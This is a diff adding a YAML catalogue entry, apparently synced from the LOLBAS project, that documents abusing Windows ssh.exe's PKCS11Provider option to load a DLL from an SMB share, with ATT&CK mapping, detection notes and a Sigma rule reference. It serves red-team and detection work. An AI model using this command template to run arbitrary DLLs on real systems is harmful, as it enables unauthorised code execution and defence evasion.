@@ -1,0 +1,32 @@
+id: lolbas/ssh/execute/2
+type: binary
+platform: windows
+name: ssh.exe
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0 (verify upstream LICENSE)
+  upstream_version: 9c5e384
+  last_synced: '2026-08-25'
+attack_techniques:
+- T1202
+opsec:
+  noise: high
+  triggers: Event ID 4624 with process name C:\Windows\System32\OpenSSH\sshd.exe.
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_ssh.yml
+commands:
+- template: ssh -o PKCS11Provider="\\\\127.0.0.1\\Temp\\example.dll" win@github.com
+  comment: Executes a DLL from an SMB share by abusing the PKCS11Provider option. The payload executes
+    upon DLL load (DllMain) and requires exporting C_GetFunctionList to prevent premature termination
+    by `ssh.exe`. Note that all backslashes should be escaped (i.e. every `\` should be turned into `\\`).
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/Ssh/
+tags:
+- windows
+- lolbas
